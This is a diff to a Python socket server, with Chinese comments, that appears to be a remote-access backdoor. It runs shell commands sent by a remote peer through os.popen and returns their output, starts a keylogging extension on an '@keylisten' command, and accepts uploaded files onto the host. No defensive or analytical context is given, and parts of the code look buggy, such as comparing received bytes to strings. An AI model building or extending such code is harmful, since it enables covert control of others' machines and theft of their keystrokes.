@@ -23,7 +23,6 @@ while 1:
         try:
             data = conn.recv(1024)  # 接收对方字符串 #如果对方不发数据会卡住
             print(data)
-            print(len(data))
             if len(data)<=0 or data=="\n" or data=="\r" or data=="":
                 print("对方发送了空数据")
                 data2="你发送了空数据"
@@ -35,38 +34,36 @@ while 1:
                 data=data.replace("$","")
                 f = os.popen(data)  # 可以将命令的内容以读取的方式返回
                 data2 = f.read()
+                
             elif(data[0]=="@"):
                 data=data.replace("@","")
-                print(data)
                 if data=="keylisten": 
                     run_extend("key")
                 if data=="del_keylisten": 
                     run_extend("key")
-            
-            fileinfo_size = struct.calcsize('128sl')
-            print(fileinfo_size)
-            buf = conn.recv(fileinfo_size)
-            if buf:
-                        print("recv file")
-                        filename, filesize = struct.unpack('128sl', buf)
-                        print(filename, filesize)
-                        fn = filename.strip('\00')
-                        new_filename = os.path.join('./', 'new_' + fn)
+                if "upload" in data:
+                        conn.send(bytes("ok", encoding="gbk"))
+                        recv_file=data.replace("upload ","")
+                        print("recv file<----"+recv_file)
                         recvd_size = 0  # 定义已接收文件的大小
-                        fp = open(new_filename, 'wb')
-                        while not recvd_size == filesize:
-                            if filesize - recvd_size > 1024:
+                        fp = open(recv_file.replace("txt","upload"), 'ab')
+                        file_size=int(conn.recv(1024))
+                        print("recv size:",file_size)
+                        while not recvd_size == file_size:
+                            if file_size - recvd_size > 1024:
                                 data = conn.recv(1024)
                                 recvd_size += len(data)
                             else:
-                                data = conn.recv(filesize - recvd_size)
-                                recvd_size = filesize
+                                data = conn.recv(file_size - recvd_size)
+                                recvd_size = file_size
                             fp.write(data)
                         fp.close()
-                        data2="success"
-            data=0
+                        conn.send(bytes("success", encoding="gbk"))
+
+            else:
+                conn.send(bytes(data2, encoding="gbk"))
             #print(data2)
-            conn.send(bytes(data2, encoding="gbk"))  # 发送命令运行结果
+              # 发送命令运行结果
         except ConnectionResetError:
             print("远程主机强迫关闭了一个现有的连接。")
             time.sleep(1)
